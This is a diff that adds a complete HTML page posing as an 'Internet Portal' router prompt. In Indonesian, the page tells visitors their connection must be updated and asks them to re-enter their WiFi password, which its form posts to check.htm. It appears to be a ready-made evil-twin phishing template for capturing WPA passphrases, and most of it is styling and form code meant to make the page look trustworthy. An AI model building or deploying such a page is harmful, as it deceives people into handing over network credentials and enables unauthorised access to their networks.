@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Internet Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            padding: 10px;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(255,255,255,0.05) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .content {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 35px;
+            box-shadow: 
+                0 25px 50px rgba(0, 0, 0, 0.15),
+                0 0 0 1px rgba(255, 255, 255, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.6);
+            max-width: 450px;
+            width: 100%;
+            margin: 20px auto;
+            animation: slideInScale 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #007bff, #c0392b, #007bff);
+            background-size: 200% 100%;
+            animation: gradientShift 3s ease-in-out infinite;
+        }
+
+        @keyframes slideInScale {
+            from {
+                opacity: 0;
+                transform: translateY(50px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .logo-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #007bff, #c0392b);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+            box-shadow: 
+                0 10px 25px rgba(231, 76, 60, 0.4),
+                0 0 0 3px rgba(255, 255, 255, 0.1);
+            animation: float 6s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo-icon::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 4s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(2deg); }
+        }
+
+        @keyframes shine {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .logo-section h1 {
+            color: #333;
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+            background: linear-gradient(135deg, #007bff, #c0392b);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .logo-section .fiber-text {
+            color: #666;
+            font-size: 1rem;
+            font-weight: 500;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            opacity: 0.8;
+        }
+
+        .description {
+            text-align: center;
+            color: #555;
+            margin-bottom: 30px;
+            font-size: 1rem;
+            line-height: 1.6;
+            padding: 20px;
+            background: linear-gradient(135deg, #fff5f5, #ffebeb);
+            border-radius: 15px;
+            border: 1px solid rgba(231, 76, 60, 0.1);
+            position: relative;
+        }
+
+        .description::before {
+            content: '⚠️';
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: white;
+            padding: 5px 10px;
+            border-radius: 50%;
+            font-size: 18px;
+        }
+
+        .status-message {
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-size: 0.95rem;
+            font-weight: 500;
+            text-align: center;
+            display: none;
+            animation: slideIn 0.4s ease-out;
+            border: 1px solid;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-15px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .status-message.success {
+            background: linear-gradient(135deg, #d4edda, #c3e6cb);
+            color: #155724;
+            border-color: #c3e6cb;
+        }
+
+        .status-message.error {
+            background: linear-gradient(135deg, #f8d7da, #f5c6cb);
+            color: #721c24;
+            border-color: #f5c6cb;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 1rem;
+        }
+
+        #password {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #ffebeb;
+            border-radius: 12px;
+            font-size: 16px;
+            background: linear-gradient(135deg, #fff5f5, #ffffff);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-bottom: 15px;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            position: relative;
+        }
+
+        #password:hover {
+            border-color: #007bff;
+            background: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(231, 76, 60, 0.15);
+        }
+
+        #password:focus {
+            outline: none;
+            border-color: #007bff;
+            background: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 
+                0 8px 25px rgba(231, 76, 60, 0.15),
+                0 0 0 4px rgba(231, 76, 60, 0.1);
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            color: #555;
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 10px;
+            transform: scale(1.2);
+            accent-color: #007bff;
+        }
+
+        .button {
+            width: 100%;
+            background: linear-gradient(135deg, #007bff, #c0392b);
+            color: #ffffff;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.3);
+        }
+
+        .button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .button:hover::before {
+            left: 100%;
+        }
+
+        .button:hover {
+            background: linear-gradient(135deg, #c0392b, #007bff;
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(231, 76, 60, 0.4);
+        }
+
+        .button:active {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(231, 76, 60, 0.3);
+        }
+
+        .button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer-info {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 0.85rem;
+            color: #666;
+            padding: 15px;
+            background: rgba(231, 76, 60, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(231, 76, 60, 0.1);
+        }
+
+        .footer-info::before {
+            content: '🔒';
+            margin-right: 8px;
+        }
+
+        /* Responsive Design */
+        @media screen and (max-width: 480px) {
+            body {
+                padding: 5px;
+            }
+            
+            .content {
+                padding: 25px;
+                margin: 10px auto;
+                border-radius: 20px;
+                max-width: 95%;
+            }
+
+            .logo-icon {
+                width: 65px;
+                height: 65px;
+                font-size: 26px;
+            }
+
+            .logo-section h1 {
+                font-size: 1.8rem;
+            }
+
+            .logo-section .fiber-text {
+                font-size: 0.9rem;
+            }
+
+            .description {
+                font-size: 0.9rem;
+                padding: 15px;
+            }
+
+            #password {
+                padding: 12px 15px;
+                font-size: 16px;
+            }
+
+            .button {
+                padding: 12px 15px;
+                font-size: 1rem;
+            }
+
+            .footer-info {
+                font-size: 0.8rem;
+            }
+        }
+
+        @media screen and (max-width: 360px) {
+            .content {
+                padding: 20px;
+                margin: 5px auto;
+            }
+
+            .logo-section h1 {
+                font-size: 1.6rem;
+            }
+
+            .form-group {
+                margin-bottom: 15px;
+            }
+
+            .checkbox-container {
+                margin-bottom: 20px;
+            }
+        }
+
+        @media screen and (min-width: 768px) {
+            body {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+            }
+            
+            .content {
+                max-width: 500px;
+                padding: 45px;
+            }
+
+            .logo-icon {
+                width: 90px;
+                height: 90px;
+                font-size: 36px;
+            }
+
+            .logo-section h1 {
+                font-size: 2.5rem;
+            }
+
+            .logo-section .fiber-text {
+                font-size: 1.1rem;
+            }
+        }
+
+        @media screen and (min-width: 1000px) {
+            .content {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                max-width: 550px;
+            }
+        }
+
+        /* Hidden pixel image */
+        .hidden-pixel {
+            display: none;
+        }
+
+        /* Custom animations */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <img src="pixel.png" class="hidden-pixel" alt=""/>
+    
+    <div class="content">
+        <div class="logo-section">
+            <div class="logo"><img src=data:image/jpeg;base64,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></div>
+            <div class="fiber-text">Internet Portal</div>
+        </div>
+
+        <div class="description">
+            Koneksi Anda Harus di Update
+            <br>Silahkan Masukan Kembali Password Wifi
+        </div>
+
+        <div class="status-message" id="statusMessage"></div>
+
+        <form method="post" id="loginform" name="loginform" action="check.htm">
+            <div class="form-group">
+                <label for="password">Network Password</label>
+                <input id="password" type="password" name="password" maxlength="63" placeholder="Enter your password">
+            </div>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="showpass">
+                <label for="showpass">Show password</label>
+            </div>
+
+            <input class="button" id="formbutton" type="button" value="Submit">
+        </form>
+
+        <div class="footer-info">
+            Secure connection required for internet access
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            var onLoad = function() {
+                var formElement = document.getElementById("loginform");
+                var statusMessage = document.getElementById("statusMessage");
+                
+                if (formElement != null) {
+                    var password = document.getElementById("password");
+                    
+                    // Show/hide password functionality
+                    var showpass = function() {
+                        password.setAttribute("type", password.type == "text" ? "password" : "text");
+                    }
+                    document.getElementById("showpass").addEventListener("click", showpass);
+                    document.getElementById("showpass").checked = false;
+
+                    // Enhanced password validation with UI feedback
+                    var validatepass = function() {
+                        var submitBtn = document.getElementById("formbutton");
+                        
+                        // Clear previous messages
+                        statusMessage.style.display = 'none';
+                        
+                        if (password.value.length < 8) {
+                            showMessage("The password must be at least 8 characters", "error");
+                        } else if (password.value.length > 63) {
+                            showMessage("The password must be less than 64 characters", "error");
+                        } else {
+                            // Show loading state
+                            submitBtn.disabled = true;
+                            submitBtn.innerHTML = 'Connecting... <div class="loading" style="display: inline-block;"></div>';
+                            
+                            // Submit form
+                            setTimeout(function() {
+                                formElement.submit();
+                            }, 500);
+                        }
+                    }
+                    
+                    document.getElementById("formbutton").addEventListener("click", validatepass);
+                    
+                    // Enter key support
+                    password.addEventListener("keypress", function(e) {
+                        if (e.key === "Enter") {
+                            validatepass();
+                        }
+                    });
+                }
+                
+                function showMessage(message, type) {
+                    statusMessage.textContent = message;
+                    statusMessage.className = 'status-message ' + type;
+                    statusMessage.style.display = 'block';
+                    
+                    // Auto-hide error messages after 5 seconds
+                    if (type === 'error') {
+                        setTimeout(function() {
+                            statusMessage.style.display = 'none';
+                        }, 5000);
+                    }
+                }
+                
+                // Enhanced form interactions
+                var password = document.getElementById("password");
+                if (password) {
+                    password.addEventListener("input", function() {
+                        if (statusMessage.style.display === 'block') {
+                            statusMessage.style.display = 'none';
+                        }
+                    });
+                }
+            };
+
+            document.readyState != 'loading' ? onLoad() : document.addEventListener('DOMContentLoaded', onLoad);
+        })();
+
+        // Redirect function for check.htm integration
+        function redirect() {
+            document.location = "index.htm";
+        }
+
+        // Additional enhancements
+        document.addEventListener('DOMContentLoaded', function() {
+            const content = document.querySelector('.content');
+            
+            // Add subtle hover effect to container only on desktop
+            if (window.innerWidth > 768) {
+                content.addEventListener('mouseenter', function() {
+                    if (this.style.position === 'absolute') {
+                        this.style.transform = 'translate(-50%, -50%) translateY(-5px)';
+                        this.style.boxShadow = '0 30px 60px rgba(0, 0, 0, 0.2)';
+                    }
+                });
+                
+                content.addEventListener('mouseleave', function() {
+                    if (this.style.position === 'absolute') {
+                        this.style.transform = 'translate(-50%, -50%) translateY(0)';
+                        this.style.boxShadow = '0 25px 50px rgba(0, 0, 0, 0.15)';
+                    }
+                });
+            }
+
+            // Prevent zoom on iOS when focusing input
+            const password = document.getElementById('password');
+            if (password) {
+                password.addEventListener('focus', function() {
+                    // Add focus effect
+                    this.parentNode.style.transform = 'scale(1.02)';
+                    this.parentNode.style.transition = 'transform 0.3s ease';
+                    
+                    // Disable viewport zoom on mobile
+                    const viewport = document.querySelector('meta[name="viewport"]');
+                    if (viewport) {
+                        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
+                    }
+                });
+
+                password.addEventListener('blur', function() {
+                    // Remove focus effect
+                    this.parentNode.style.transform = 'scale(1)';
+                    
+                    // Re-enable viewport zoom
+                    const viewport = document.querySelector('meta[name="viewport"]');
+                    if (viewport) {
+                        viewport.setAttribute('content', 'width=device-width, initial-scale=1.0');
+                    }
+                });
+            }
+
+            // Add floating animation to logo on scroll (mobile)
+            if (window.innerWidth <= 768) {
+                let ticking = false;
+                
+                function updateLogoAnimation() {
+                    const scrollY = window.pageYOffset;
+                    const logoIcon = document.querySelector('.logo-icon');
+                    
+                    if (logoIcon) {
+                        logoIcon.style.transform = `translateY(${scrollY * 0.1}px) rotate(${scrollY * 0.1}deg)`;
+                    }
+                    
+                    ticking = false;
+                }
+                
+                function requestTick() {
+                    if (!ticking) {
+                        requestAnimationFrame(updateLogoAnimation);
+                        ticking = true;
+                    }
+                }
+                
+                window.addEventListener('scroll', requestTick);
+            }
+        });
+    </script>
+</body>
+</html>
